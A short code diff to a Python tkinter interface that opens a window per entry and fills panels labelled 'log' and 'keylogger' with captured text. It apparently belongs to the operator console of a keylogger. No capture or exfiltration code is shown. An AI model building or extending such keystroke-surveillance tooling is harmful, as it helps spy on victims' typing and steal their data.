@@ -20,8 +20,6 @@ def tkinter():
         window.after(500,loop)
     def newtab(select):
         global dic
-        new_text = len(dic[list(dic.keys())[select]]['text'])-1
-        new_log = len(dic[list(dic.keys())[select]]['log'])-1
         new = tk.Toplevel(window)
         new.title(list(dic.keys())[select])
         new.geometry("1380x950+300+150")
@@ -45,14 +43,22 @@ def tkinter():
         label5 = tk.Label(new, text="log", font=16,bg="black",fg="green")
         label6 = tk.Label(new, text="keylogger", font=16,bg="black",fg="green")
         label7 = tk.Label(new, text="nowtab", font=16,bg="black",fg="green")
+        ts=""
+        ts2=""
+        for i in dic[list(dic.keys())[select]]['log']:
+            ts = ts + f"{i}\n"
+        for i in dic[list(dic.keys())[select]]['text']:
+            ts2 = ts2 + f"{i}\n"
+        entty1.insert(1.0, ts)
+        entty2.insert(1.0, ts2)
         def loop():
             str1 = ""
             str2 = ""
             wrong = None
             wrong2 = None
-            for i in dic[list(dic.keys())[select]]['log'][new_log:]:
+            for i in dic[list(dic.keys())[select]]['log']:
                 str1 = str1 + i
-            for i in dic[list(dic.keys())[select]]['text'][new_text:]:
+            for i in dic[list(dic.keys())[select]]['text']:
                 str2 = str2 + i
             for i,z in zip(str1.replace("\n","").split("@"),range(0,len(str1.replace("\n","").split("@")))):
                 check = False
